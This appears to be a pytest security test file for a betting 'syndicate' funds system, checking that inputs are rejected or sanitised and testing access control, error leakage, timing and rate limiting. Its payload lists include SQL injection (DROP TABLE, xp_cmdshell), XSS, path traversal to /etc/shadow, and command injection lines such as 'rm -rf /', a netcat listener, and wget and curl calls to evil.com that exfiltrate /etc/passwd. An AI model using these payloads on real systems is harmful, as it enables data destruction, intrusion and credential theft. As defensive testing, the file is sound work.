"""
Security Validation Tests for Fantasy Collective System
Comprehensive security testing including input validation, access control, and vulnerability prevention
"""

import pytest
import time
import json
import hashlib
import base64
import threading
from datetime import datetime, timedelta
from decimal import Decimal
from unittest.mock import Mock, patch
from typing import Dict, List, Any, Optional

# Import system under test
from src.syndicate.syndicate_tools import (
    create_syndicate, add_member, get_syndicate_status,
    allocate_funds, distribute_profits, process_withdrawal,
    get_member_performance, update_member_contribution,
    get_member_list, calculate_tax_liability
)


class SecurityTestVectors:
    """Security test vectors for comprehensive vulnerability testing"""
    
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE syndicates; --",
        "' OR '1'='1'; --",
        "admin'; DELETE FROM members WHERE '1'='1'; --",
        "' UNION SELECT password FROM users WHERE username='admin'; --",
        "'; INSERT INTO members (role) VALUES ('admin'); --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0; --",
        "' OR SLEEP(5); --",
        "' OR BENCHMARK(10000000,MD5('test')); --",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,version(),NULL; --",
        "'; EXEC xp_cmdshell('whoami'); --"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input type='text' value='' onfocus='alert(\"XSS\")'>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><script>alert('XSS')</script>",
        "<script>document.cookie='XSS='+document.cookie</script>"
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/var/www/../../etc/passwd",
        "\\..\\..\\..\\etc\\passwd"
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(id)",
        "; rm -rf /",
        "| nc -l 4444",
        "; wget http://evil.com/shell",
        "&& echo 'injected'",
        "|| echo 'injected'",
        "; python -c 'import os; os.system(\"ls\")'",
        "`curl http://evil.com/exfiltrate?data=$(cat /etc/passwd)`"
    ]
    
    LDAP_INJECTION_PAYLOADS = [
        "*)(uid=*",
        "*)(|(objectClass=*))",
        ")(cn=*))(|(cn=*",
        "*))%00",
        "admin)(|(password=*",
        "*)(&(objectClass=user)(cn=*"
    ]
    
    NOSQL_INJECTION_PAYLOADS = [
        "' || '1'=='1",
        "{$ne: null}",
        "{$gt: ''}",
        "{$where: 'this.a == this.b'}",
        "'; return true; var x='",
        "{$regex: '.*'}",
        "[$ne]=1",
        "{$exists: true}"
    ]
    
    OVERSIZED_INPUTS = [
        "A" * 1000,    # 1KB
        "A" * 10000,   # 10KB  
        "A" * 100000,  # 100KB
        "A" * 1000000, # 1MB
    ]
    
    SPECIAL_CHARACTERS = [
        "\x00",  # Null byte
        "\r\n",  # CRLF
        "\x1f",  # Unit separator
        "\x7f",  # Delete
        "\xff",  # Extended ASCII
        "\u0000", # Unicode null
        "\u200B", # Zero-width space
        "\uFEFF", # Byte order mark
    ]
    
    FORMAT_STRING_PAYLOADS = [
        "%x %x %x %x",
        "%s%s%s%s%s%s%s",
        "%d",
        "%f",
        "%c",
        "%n",
        "%.1000000f",
        "%*%*%*%*%*%*%*"
    ]


class TestInputValidationSecurity:
    """Test input validation and sanitization security"""
    
    def test_sql_injection_prevention_syndicate_creation(self):
        """Test SQL injection prevention in syndicate creation"""
        for payload in SecurityTestVectors.SQL_INJECTION_PAYLOADS:
            # Test malicious syndicate ID
            result = create_syndicate(payload, "Test Syndicate")
            self._assert_safe_failure(result, payload, "syndicate_id")
            
            # Test malicious name
            result = create_syndicate("test-id", payload)
            self._assert_safe_failure(result, payload, "name")
            
            # Test malicious description
            result = create_syndicate("test-id", "Test Name", payload)
            self._assert_safe_failure(result, payload, "description")
    
    def test_sql_injection_prevention_member_operations(self):
        """Test SQL injection prevention in member operations"""
        # Setup clean syndicate
        create_syndicate("sql-test", "SQL Test Syndicate")
        
        for payload in SecurityTestVectors.SQL_INJECTION_PAYLOADS[:5]:  # Test subset for performance
            # Test malicious member name
            result = add_member("sql-test", payload, "test@example.com", 
                              "contributing_member", 10000.0)
            self._assert_safe_failure(result, payload, "member_name")
            
            # Test malicious email
            result = add_member("sql-test", "Test User", payload, 
                              "contributing_member", 10000.0)
            self._assert_safe_failure(result, payload, "member_email")
            
            # Test malicious role (should be validated against enum)
            result = add_member("sql-test", "Test User", "safe@example.com", 
                              payload, 10000.0)
            self._assert_safe_failure(result, payload, "member_role")
    
    def test_xss_prevention_in_text_fields(self):
        """Test XSS prevention in text input fields"""
        create_syndicate("xss-test", "XSS Test Syndicate")
        
        for payload in SecurityTestVectors.XSS_PAYLOADS:
            # Test XSS in member name
            result = add_member("xss-test", payload, "xss1@example.com", 
                              "contributing_member", 10000.0)
            
            if result.get("status") != "failed":
                # If successful, verify payload was sanitized
                assert result.get("name", "") != payload, f"XSS payload not sanitized: {payload}"
                # Common XSS indicators should be removed/escaped
                sanitized_name = result.get("name", "")
                assert "<script>" not in sanitized_name.lower()
                assert "javascript:" not in sanitized_name.lower()
                assert "onerror=" not in sanitized_name.lower()
    
    def test_path_traversal_prevention(self):
        """Test path traversal prevention"""
        for payload in SecurityTestVectors.PATH_TRAVERSAL_PAYLOADS:
            # Test in various string fields
            result = create_syndicate(payload, "Path Traversal Test")
            self._assert_safe_failure(result, payload, "path_traversal_syndicate_id")
            
            result = create_syndicate("path-test", payload)
            self._assert_safe_failure(result, payload, "path_traversal_name")
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        create_syndicate("cmd-test", "Command Injection Test")
        
        for payload in SecurityTestVectors.COMMAND_INJECTION_PAYLOADS:
            # Test command injection in member fields
            result = add_member("cmd-test", payload, "cmd@example.com", 
                              "contributing_member", 10000.0)
            self._assert_safe_failure(result, payload, "command_injection_name")
    
    def test_oversized_input_handling(self):
        """Test handling of oversized inputs"""
        for size, oversized_input in enumerate(SecurityTestVectors.OVERSIZED_INPUTS):
            # Test oversized syndicate name
            result = create_syndicate(f"size-test-{size}", oversized_input)
            
            if result.get("status") != "failed":
                # If accepted, should be truncated to reasonable length
                returned_name = result.get("name", "")
                assert len(returned_name) <= 255, f"Oversized input not truncated: {len(returned_name)} chars"
            
            # Test oversized member name
            if size < 2:  # Only test smaller sizes for member operations (performance)
                create_syndicate(f"member-size-{size}", "Size Test")
                result = add_member(f"member-size-{size}", oversized_input, 
                                  f"size{size}@example.com", "contributing_member", 10000.0)
                
                if result.get("status") != "failed":
                    returned_name = result.get("name", "")
                    assert len(returned_name) <= 255, f"Oversized member name not truncated: {len(returned_name)} chars"
    
    def test_special_character_handling(self):
        """Test handling of special characters and control characters"""
        create_syndicate("special-test", "Special Character Test")
        
        for char in SecurityTestVectors.SPECIAL_CHARACTERS:
            test_string = f"User{char}Name"
            
            result = add_member("special-test", test_string, f"special{ord(char)}@example.com",
                              "contributing_member", 10000.0)
            
            if result.get("status") != "failed":
                # Special characters should be handled safely
                returned_name = result.get("name", "")
                # Null bytes and other dangerous characters should be removed
                assert "\x00" not in returned_name
                assert len(returned_name) > 0  # Should not be empty after sanitization
    
    def test_numeric_input_validation(self):
        """Test numeric input validation and boundary conditions"""
        create_syndicate("numeric-test", "Numeric Validation Test")
        
        # Test invalid contribution amounts
        invalid_amounts = [
            -999999.99,  # Negative amount
            0,            # Zero contribution  
            float('inf'), # Infinity
            float('nan'), # NaN
            1e20,         # Extremely large number
            -1e20,        # Extremely large negative
        ]
        
        for amount in invalid_amounts:
            try:
                result = add_member("numeric-test", "Numeric User", 
                                  f"numeric{hash(str(amount))}@example.com",
                                  "contributing_member", amount)
                
                # Should either fail or sanitize to valid range
                if result.get("status") != "failed":
                    contribution = result.get("capital_contribution", 0)
                    assert 0 <= contribution <= 10000000, f"Invalid contribution not sanitized: {contribution}"
                    
            except (ValueError, TypeError, OverflowError):
                # Expected for invalid numeric inputs
                pass
    
    def test_format_string_injection_prevention(self):
        """Test format string injection prevention"""
        create_syndicate("format-test", "Format String Test")
        
        for payload in SecurityTestVectors.FORMAT_STRING_PAYLOADS:
            result = add_member("format-test", payload, f"format{hash(payload)}@example.com",
                              "contributing_member", 10000.0)
            
            # Format string payloads should not cause system errors or information disclosure
            if result.get("status") != "failed":
                returned_name = result.get("name", "")
                # Should not contain format specifiers that could leak information
                assert "%x" not in returned_name
                assert "%s" not in returned_name
                assert "%n" not in returned_name
    
    def _assert_safe_failure(self, result: Dict, payload: str, context: str):
        """Assert that dangerous input results in safe failure"""
        # Either should fail safely or sanitize the input
        if result.get("status") == "failed":
            # Error message should not reveal system information
            error_msg = result.get("error", "").lower()
            
            # Should not contain SQL error indicators
            sql_indicators = ["syntax error", "mysql", "postgresql", "sqlite", "oracle", 
                            "sql", "database", "table", "column", "constraint"]
            for indicator in sql_indicators:
                assert indicator not in error_msg, f"SQL error leaked in {context}: {error_msg}"
            
            # Should not contain system path information
            path_indicators = ["/etc/", "/var/", "c:\\", "system32", "/root/"]
            for indicator in path_indicators:
                assert indicator not in error_msg, f"Path information leaked in {context}: {error_msg}"
        
        else:
            # If operation succeeded, dangerous payload should have been sanitized
            for field_name, field_value in result.items():
                if isinstance(field_value, str):
                    # Dangerous characters should be removed/escaped
                    assert payload not in field_value, f"Dangerous payload not sanitized in {context}.{field_name}"


class TestAccessControlSecurity:
    """Test access control and authorization security"""
    
    def test_role_based_access_control(self):
        """Test role-based access control enforcement"""
        create_syndicate("rbac-test", "RBAC Test Syndicate")
        
        # Create users with different roles
        lead_result = add_member("rbac-test", "Lead Investor", "lead@rbac.test",
                               "lead_investor", 100000.0)
        analyst_result = add_member("rbac-test", "Senior Analyst", "analyst@rbac.test", 
                                  "senior_analyst", 50000.0)
        observer_result = add_member("rbac-test", "Observer", "observer@rbac.test",
                                   "observer", 5000.0)
        
        lead_id = lead_result.get("member_id")
        analyst_id = analyst_result.get("member_id")
        observer_id = observer_result.get("member_id")
        
        # Test withdrawal limits based on role/contribution
        # Observer should not be able to withdraw more than their contribution
        large_withdrawal = process_withdrawal("rbac-test", observer_id, 50000.0, False)
        
        if large_withdrawal.get("status") not in ["failed", "rejected"]:
            # If approved, should be limited
            approved_amount = large_withdrawal.get("approved_amount", 0)
            assert approved_amount <= 5000.0, f"Observer allowed excessive withdrawal: {approved_amount}"
        
        # Test that roles are properly validated
        invalid_roles = ["super_admin", "root", "admin", "", "null", "undefined"]
        
        for invalid_role in invalid_roles:
            result = add_member("rbac-test", "Invalid Role User", "invalid@rbac.test",
                              invalid_role, 10000.0)
            
            # Should reject invalid roles
            assert result.get("status") == "failed", f"Invalid role {invalid_role} was accepted"
    
    def test_member_data_isolation(self):
        """Test that member data is properly isolated between syndicates"""
        # Create two separate syndicates
        create_syndicate("isolation-1", "Isolation Test 1")
        create_syndicate("isolation-2", "Isolation Test 2")
        
        # Add members to each
        member1_result = add_member("isolation-1", "User One", "user1@isolation.test",
                                  "contributing_member", 25000.0)
        member2_result = add_member("isolation-2", "User Two", "user2@isolation.test", 
                                  "contributing_member", 35000.0)
        
        member1_id = member1_result.get("member_id")
        member2_id = member2_result.get("member_id")
        
        # Test that member from syndicate 1 cannot access syndicate 2 data
        cross_performance = get_member_performance("isolation-1", member2_id)
        assert cross_performance.get("status") == "failed", "Cross-syndicate member access allowed"
        
        # Test that member list is properly filtered
        members_1 = get_member_list("isolation-1")
        members_2 = get_member_list("isolation-2") 
        
        if members_1.get("status") != "failed" and members_2.get("status") != "failed":
            member_ids_1 = [m["member_id"] for m in members_1.get("members", [])]
            member_ids_2 = [m["member_id"] for m in members_2.get("members", [])]
            
            # No overlap should exist
            assert member1_id in member_ids_1 and member1_id not in member_ids_2
            assert member2_id in member_ids_2 and member2_id not in member_ids_1
    
    def test_unauthorized_syndicate_access(self):
        """Test prevention of unauthorized syndicate access"""
        create_syndicate("authorized", "Authorized Syndicate")
        
        # Test access with non-existent syndicate ID
        nonexistent_access = get_syndicate_status("nonexistent-syndicate")
        assert nonexistent_access.get("status") == "failed", "Non-existent syndicate access allowed"
        
        # Test access with malformed syndicate IDs
        malformed_ids = ["", None, "../../admin", "'; DROP TABLE syndicates; --"]
        
        for malformed_id in malformed_ids:
            try:
                result = get_syndicate_status(malformed_id)
                assert result.get("status") == "failed", f"Malformed syndicate ID access allowed: {malformed_id}"
            except (TypeError, ValueError):
                # Expected for None and other invalid types
                pass
    
    def test_parameter_tampering_protection(self):
        """Test protection against parameter tampering"""
        create_syndicate("tamper-test", "Parameter Tampering Test")
        member_result = add_member("tamper-test", "Tamper User", "tamper@example.com",
                                 "contributing_member", 30000.0)
        member_id = member_result.get("member_id")
        
        # Test tampering with contribution amounts
        tamper_attempts = [
            {"amount": -999999.99, "description": "negative contribution"},
            {"amount": 1e20, "description": "excessive contribution"},
            {"amount": float('inf'), "description": "infinite contribution"},
            {"amount": float('nan'), "description": "NaN contribution"}
        ]
        
        for attempt in tamper_attempts:
            try:
                result = update_member_contribution("tamper-test", member_id, attempt["amount"])
                
                if result.get("status") != "failed":
                    # If successful, should be within reasonable bounds
                    additional_amount = result.get("additional_amount", 0)
                    assert -100000 <= additional_amount <= 1000000, \
                        f"Tampered contribution not bounded: {additional_amount} ({attempt['description']})"
                        
            except (ValueError, OverflowError, TypeError):
                # Expected for invalid numeric values
                pass
    
    def test_session_and_state_security(self):
        """Test session management and state security"""
        # This test simulates concurrent access that could lead to state corruption
        create_syndicate("state-test", "State Security Test")
        add_member("state-test", "State User", "state@example.com", 
                  "contributing_member", 50000.0)
        
        def concurrent_state_modifier(worker_id: int, results: List):
            """Function to modify state concurrently"""
            try:
                # Multiple operations that could interfere with each other
                for i in range(5):
                    # Status check
                    status = get_syndicate_status("state-test")
                    
                    # Allocation operation
                    opp = [{
                        "sport": "NFL", "event": f"State Test {worker_id}-{i}",
                        "bet_type": "spread", "selection": "Team -3", "odds": 1.90,
                        "probability": 0.53, "edge": 0.02, "confidence": 0.65,
                        "model_agreement": 0.75, "hours_until_event": 24, "liquidity": 50000
                    }]
                    allocation = allocate_funds("state-test", opp, "kelly_criterion")
                    
                    results.append({
                        "worker_id": worker_id,
                        "iteration": i,
                        "status_success": status.get("status") != "failed",
                        "allocation_success": allocation.get("status") != "failed"
                    })
                    
            except Exception as e:
                results.append({"worker_id": worker_id, "error": str(e)})
        
        # Run concurrent operations
        results = []
        threads = []
        
        for i in range(5):
            thread = threading.Thread(target=concurrent_state_modifier, args=(i, results))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=30)
        
        # Analyze results for consistency
        successful_operations = [r for r in results if "error" not in r]
        assert len(successful_operations) >= 20, "Concurrent operations failed excessively"
        
        # State should remain consistent
        final_status = get_syndicate_status("state-test")
        assert final_status.get("status") != "failed", "Final state corrupted by concurrent access"


class TestDataProtectionSecurity:
    """Test data protection and privacy security"""
    
    def test_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure"""
        create_syndicate("privacy-test", "Privacy Test Syndicate")
        member_result = add_member("privacy-test", "Privacy User", "privacy@example.com",
                                 "contributing_member", 40000.0)
        member_id = member_result.get("member_id")
        
        # Test member performance data
        performance = get_member_performance("privacy-test", member_id)
        
        if performance.get("status") != "failed":
            # Check for sensitive data that should not be exposed
            performance_str = json.dumps(performance).lower()
            
            sensitive_fields = [
                "password", "passwd", "secret", "token", "key", "private",
                "ssn", "social", "credit_card", "bank_account", "routing",
                "api_key", "auth_token", "session_id", "cookie"
            ]
            
            for sensitive_field in sensitive_fields:
                assert sensitive_field not in performance_str, \
                    f"Sensitive field '{sensitive_field}' exposed in performance data"
    
    def test_financial_data_precision_and_security(self):
        """Test financial data precision and security"""
        create_syndicate("finance-test", "Financial Security Test")
        member_result = add_member("finance-test", "Finance User", "finance@example.com",
                                 "contributing_member", 123456.789)
        
        # Test that financial amounts maintain precision
        if member_result.get("status") != "failed":
            contribution = member_result.get("capital_contribution", 0)
            
            # Should maintain reasonable precision (2-3 decimal places)
            assert isinstance(contribution, (int, float)), "Contribution should be numeric"
            
            # Should not expose excessive precision that could leak information
            contribution_str = str(contribution)
            decimal_places = len(contribution_str.split('.')[-1]) if '.' in contribution_str else 0
            assert decimal_places <= 3, f"Excessive precision exposed: {decimal_places} decimal places"
    
    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information"""
        # Test various error conditions
        error_scenarios = [
            {"func": create_syndicate, "args": ("", ""), "context": "empty syndicate creation"},
            {"func": add_member, "args": ("nonexistent", "User", "email", "role", 1000), 
             "context": "nonexistent syndicate member addition"},
            {"func": get_member_performance, "args": ("nonexistent", "fake-id"), 
             "context": "nonexistent member performance"},
            {"func": process_withdrawal, "args": ("fake", "fake-member", 1000, False),
             "context": "fake withdrawal"},
        ]
        
        for scenario in error_scenarios:
            try:
                result = scenario["func"](*scenario["args"])
                
                if result.get("status") == "failed":
                    error_msg = result.get("error", "").lower()
                    
                    # Should not contain system information
                    system_info_indicators = [
                        "traceback", "stack trace", "/usr/", "/var/", "c:\\",
                        "database", "sql", "mysql", "postgresql", "sqlite",
                        "internal server error", "exception", "debug",
                        "file not found", "permission denied", "access denied"
                    ]
                    
                    for indicator in system_info_indicators:
                        assert indicator not in error_msg, \
                            f"System information leaked in error for {scenario['context']}: {error_msg}"
                    
                    # Error message should be generic and safe
                    assert len(error_msg) < 200, f"Error message too verbose for {scenario['context']}"
                    
            except Exception as e:
                # Should not raise unhandled exceptions that could leak information
                exception_str = str(e).lower()
                assert "traceback" not in exception_str, f"Exception traceback leaked for {scenario['context']}"
    
    def test_data_serialization_security(self):
        """Test security of data serialization/deserialization"""
        create_syndicate("serialization-test", "Serialization Security Test")
        
        # Test with data that could cause serialization issues
        problematic_data = {
            "unicode_test": "Test \u0000 \uFEFF \u200B",
            "large_number": 10**100,
            "special_float": float('inf'),
            "nested_data": {"level1": {"level2": {"level3": "deep"}}},
            "circular_ref_attempt": "self-reference test"
        }
        
        for key, value in problematic_data.items():
            try:
                # Test member name with problematic data
                result = add_member("serialization-test", str(value), 
                                  f"{key}@serialization.test", "observer", 1000.0)
                
                if result.get("status") != "failed":
                    # Data should be safely serialized
                    result_str = json.dumps(result)
                    assert len(result_str) < 10000, f"Serialized data too large for {key}"
                    
                    # Should be able to deserialize safely
                    deserialized = json.loads(result_str)
                    assert isinstance(deserialized, dict), f"Deserialization failed for {key}"
                    
            except (ValueError, TypeError, OverflowError) as e:
                # Expected for some problematic inputs
                pass


class TestCryptographicSecurity:
    """Test cryptographic security aspects"""
    
    def test_random_number_security(self):
        """Test security of random number generation"""
        create_syndicate("random-test", "Random Security Test")
        
        # Generate multiple member IDs to test randomness
        member_ids = []
        for i in range(10):
            result = add_member("random-test", f"Random User {i}", 
                              f"random{i}@example.com", "observer", 1000.0)
            
            if result.get("status") != "failed":
                member_id = result.get("member_id", "")
                member_ids.append(member_id)
        
        # Check for randomness quality
        if len(member_ids) >= 5:
            # No two IDs should be identical
            unique_ids = set(member_ids)
            assert len(unique_ids) == len(member_ids), "Non-unique member IDs generated"
            
            # IDs should not be predictable sequences
            if all(isinstance(mid, str) and len(mid) > 5 for mid in member_ids):
                # Check if IDs are sequential (weak randomness)
                numeric_parts = []
                for mid in member_ids:
                    # Extract numeric parts
                    numeric_part = ''.join(c for c in mid if c.isdigit())
                    if numeric_part:
                        numeric_parts.append(int(numeric_part))
                
                if len(numeric_parts) >= 3:
                    # Check if consecutive
                    is_sequential = all(
                        numeric_parts[i+1] - numeric_parts[i] == 1 
                        for i in range(len(numeric_parts)-1)
                    )
                    assert not is_sequential, "Sequential member IDs indicate weak randomness"
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        create_syndicate("timing-test", "Timing Attack Test")
        add_member("timing-test", "Timing User", "timing@example.com", 
                  "contributing_member", 25000.0)
        
        # Test timing consistency for authentication-like operations
        valid_syndicate = "timing-test"
        invalid_syndicates = ["nonexistent", "fake", "wrong", ""]
        
        valid_times = []
        invalid_times = []
        
        # Measure response times
        for _ in range(5):
            # Valid syndicate access
            start = time.time()
            get_syndicate_status(valid_syndicate)
            valid_times.append(time.time() - start)
            
            # Invalid syndicate access
            for invalid_syndicate in invalid_syndicates:
                start = time.time()
                get_syndicate_status(invalid_syndicate)
                invalid_times.append(time.time() - start)
        
        # Response times should be consistent to prevent timing attacks
        if valid_times and invalid_times:
            avg_valid = sum(valid_times) / len(valid_times)
            avg_invalid = sum(invalid_times) / len(invalid_times)
            
            # Times should not differ significantly (more than 10x difference indicates timing leak)
            if avg_valid > 0 and avg_invalid > 0:
                ratio = max(avg_valid, avg_invalid) / min(avg_valid, avg_invalid)
                assert ratio < 10, f"Timing difference too large (ratio: {ratio:.2f}) - potential timing attack vector"


class TestRateLimitingAndDoSSecurity:
    """Test rate limiting and DoS protection security"""
    
    def test_rate_limiting_protection(self):
        """Test rate limiting protection against abuse"""
        create_syndicate("rate-limit-test", "Rate Limiting Test")
        
        # Rapid requests to test rate limiting
        start_time = time.time()
        request_count = 50
        successful_requests = 0
        blocked_requests = 0
        
        for i in range(request_count):
            result = get_syndicate_status("rate-limit-test")
            
            if result.get("status") == "failed" and "rate limit" in result.get("error", "").lower():
                blocked_requests += 1
            elif result.get("status") != "failed":
                successful_requests += 1
            
            # Brief pause to avoid overwhelming the system
            time.sleep(0.01)
        
        end_time = time.time()
        duration = end_time - start_time
        requests_per_second = request_count / duration
        
        # System should handle requests reasonably
        # Either by processing them all (if no rate limiting) or by blocking some
        assert successful_requests + blocked_requests == request_count
        
        # If rate limiting is implemented, should block excessive requests
        if blocked_requests > 0:
            assert blocked_requests < request_count, "All requests should not be blocked"
            assert successful_requests > 0, "Some requests should succeed"
        
        print(f"Rate limiting test: {requests_per_second:.1f} req/sec, "
              f"{successful_requests} successful, {blocked_requests} blocked")
    
    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks"""
        create_syndicate("resource-test", "Resource Exhaustion Test")
        
        # Test with operations that could consume excessive resources
        large_batch_opportunities = []
        
        # Create a large batch that could exhaust memory/CPU
        for i in range(100):
            large_batch_opportunities.append({
                "sport": f"Sport{i%10}",
                "event": f"Resource Test Event {i}",
                "bet_type": "spread",
                "selection": f"Team {i} -3",
                "odds": 1.85 + (i%20)*0.01,
                "probability": 0.45 + (i%40)*0.01,
                "edge": 0.01 + (i%30)*0.001,
                "confidence": 0.50 + (i%50)*0.01,
                "model_agreement": 0.60 + (i%40)*0.01,
                "hours_until_event": 12 + (i%48),
                "liquidity": 20000 + (i%20)*1000
            })
        
        # Add a member for allocation testing
        add_member("resource-test", "Resource User", "resource@example.com",
                  "contributing_member", 100000.0)
        
        start_time = time.time()
        
        try:
            # Attempt resource-intensive operation
            result = allocate_funds("resource-test", large_batch_opportunities, "kelly_criterion")
            
            end_time = time.time()
            duration = end_time - start_time
            
            # Operation should complete in reasonable time
            assert duration < 30, f"Resource-intensive operation took {duration:.1f}s - potential DoS vulnerability"
            
            # Should handle large batch gracefully
            if result.get("status") != "failed":
                allocations = result.get("allocations", [])
                # Should not process all opportunities if it would be resource-intensive
                assert len(allocations) <= 50, f"Processed {len(allocations)} opportunities - no resource limits"
            
        except Exception as e:
            # Should not crash with unhandled exceptions
            assert False, f"Resource exhaustion test caused unhandled exception: {e}"
    
    def test_concurrent_request_handling(self):
        """Test handling of concurrent requests for DoS resistance"""
        create_syndicate("concurrent-dos-test", "Concurrent DoS Test")
        add_member("concurrent-dos-test", "Concurrent User", "concurrent@example.com",
                  "contributing_member", 50000.0)
        
        def rapid_request_worker(worker_id: int, request_count: int, results: List):
            """Worker function for rapid requests"""
            worker_results = {"worker_id": worker_id, "successful": 0, "failed": 0, "errors": 0}
            
            for i in range(request_count):
                try:
                    result = get_syndicate_status("concurrent-dos-test")
                    
                    if result.get("status") == "failed":
                        worker_results["failed"] += 1
                    else:
                        worker_results["successful"] += 1
                        
                except Exception:
                    worker_results["errors"] += 1
            
            results.append(worker_results)
        
        # Launch concurrent workers
        results = []
        threads = []
        num_workers = 10
        requests_per_worker = 20
        
        start_time = time.time()
        
        for i in range(num_workers):
            thread = threading.Thread(
                target=rapid_request_worker,
                args=(i, requests_per_worker, results)
            )
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=30)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Analyze results
        total_requests = num_workers * requests_per_worker
        total_successful = sum(r["successful"] for r in results)
        total_failed = sum(r["failed"] for r in results)
        total_errors = sum(r["errors"] for r in results)
        
        # System should handle concurrent load gracefully
        assert total_successful + total_failed + total_errors == total_requests
        assert total_errors < total_requests * 0.1, f"Too many errors: {total_errors}/{total_requests}"
        
        # Should complete in reasonable time
        assert duration < 60, f"Concurrent requests took {duration:.1f}s - possible DoS vulnerability"
        
        print(f"Concurrent DoS test: {total_successful} successful, {total_failed} failed, "
              f"{total_errors} errors in {duration:.1f}s")


if __name__ == "__main__":
    # Run security tests
    pytest.main([
        "-v",
        "--tb=short",
        "-x",  # Stop on first failure for security tests
        __file__
    ])